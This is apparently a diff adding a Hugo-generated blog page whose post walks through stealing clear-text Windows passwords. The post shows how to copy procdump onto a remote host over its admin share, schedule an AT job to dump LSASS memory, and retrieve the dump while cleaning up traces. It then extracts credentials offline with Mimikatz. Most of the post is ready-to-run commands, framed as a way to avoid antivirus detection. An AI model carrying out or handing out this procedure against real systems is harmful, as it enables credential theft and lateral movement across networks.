@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="">
+  <meta name="generator" content="Hugo 0.14" />
+
+  <title>
+
+<body>
+<div id="layout">
+
+  
+<a href="#menu" id="menuLink" class="menu-link">
+  
+  <span></span>
+</a>
+<div id="menu">
+
+  
+
+  <div class="pure-menu">
+    <ul class="pure-menu-list">
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/"><i class='fa fa-home fa-fw'></i>Home</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/post/"><i class='fa fa-list fa-fw'></i>Posts</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/contact/"><i class='fa fa-phone fa-fw'></i>Contact</a>
+      
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="pure-menu social">
+  <ul class="pure-menu-list">
+
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="http://localhost:1313/index.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+    </li>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+  </ul>
+</div>
+
+  <div class="pure-g">
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>&copy; 2016. All rights reserved.</small>
+  </div>
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
+    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
+  </div>
+</div>
+
+</div>
+
+
+  <div id="main">
+
+
+<div class="header">
+  <h1>Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool</h1>
+  <h2></h2>
+</div>
+<div class="content">
+  <p>Mimikatz is now<a href="https://github.com/rapid7/meterpreter/pull/9"> built into Metasploit&rsquo;s meterpreter</a>, you can do load mimikatz from the meterpreter prompt, but if you don&rsquo;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&rsquo;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool.</p>
+
+<p>Mimikatz Minidump: <a href="http://blog.gentilkiwi.com/securite/mimikatz/minidump">http://blog.gentilkiwi.com/securite/mimikatz/minidump</a></p>
+
+<p>Procdump: <a href="http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx">http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx</a></p>
+
+<p>Lets start. First we make sure our authentication works against the box and we can look inside of C$ (usually only admins can)</p>
+
+<pre><code>net use \TARGETBOXC$ /user:DOMAINserviceaccount serviceaccount123
+dir \TARGETBOXC$
+</code></pre>
+
+<p>If that works then we want to check that we can all the &ldquo;AT&rdquo; command on the remote host:</p>
+
+<pre><code>at \TARGETBOX
+</code></pre>
+
+<p>All set. Next lets prep our workspace on the remote host. We are using the C:Temp directory.</p>
+
+<pre><code>mkdir \TARGETBOXC$Temp
+dir \TARGETBOXC$Temp
+copy c:tempprocdump.exe \TARGETBOXC$
+copy c:tempprocdump.bat \TARGETBOXC$
+</code></pre>
+
+<p>The contents of procdump.bat are:</p>
+
+<pre><code>@echo off
+C:tempprocdump.exe -accepteula -ma lsass.exe %COMPUTERNAME%_lsass.dmp
+</code></pre>
+
+<p>I&rsquo;m using the computer name in the memory dump name to help me keep track of where the dump came from, but also help me notice when I&rsquo;ve dumped more than one IP that is actually the same host.</p>
+
+<p>Next we schedule the task. Use net time to determine the local time for the remote machine.</p>
+
+<pre><code>net time \TARGETBOX
+at \TARGETBOX 13:52 C:Tempprocdump.bat
+</code></pre>
+
+<p>Pull down the file and clean up:</p>
+
+<pre><code>dir \TARGETBOXC$Temp
+copy \TARGETBOXC$Temp*lsass.dmp C:tempoutput
+rmdir /s \TARGETBOXC$Temp
+</code></pre>
+
+<p>On your side the only thing you need to make sure is that you are running Mimikatz on a similar version and architecture you pulled from. Use the following url for reference:<a href="http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png">http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png</a></p>
+
+<p>Load up the Alpha version of Mimikatz, switch it to minidump mode and you&rsquo;re dumping creds:</p>
+
+<pre><code>mimikatz # sekurlsa::minidump SUPERCOMPUTER_lsass.dmp
+Switch to MINIDUMP
+
+mimikatz # sekurlsa::logonPasswords full
+</code></pre>
+
+<p>Thats it. Password dumping without ever using a &ldquo;Hacker&rdquo; tool on target. Much love Microsoft. And even more to Mimikatz creator <a href="http://twitter.com/gentilkiwi">@gentilkiwi</a> - Benjamin Delpy for both this alpha release and changing his licensing to allow Mimikatz code to be integrated into Meterpreter.</p>
+
+</div>
+
+</div>
+</div>
+<script src="http://localhost:1313/js/ui.js"></script>
+
+
+
+
+</body>
+</html>
+
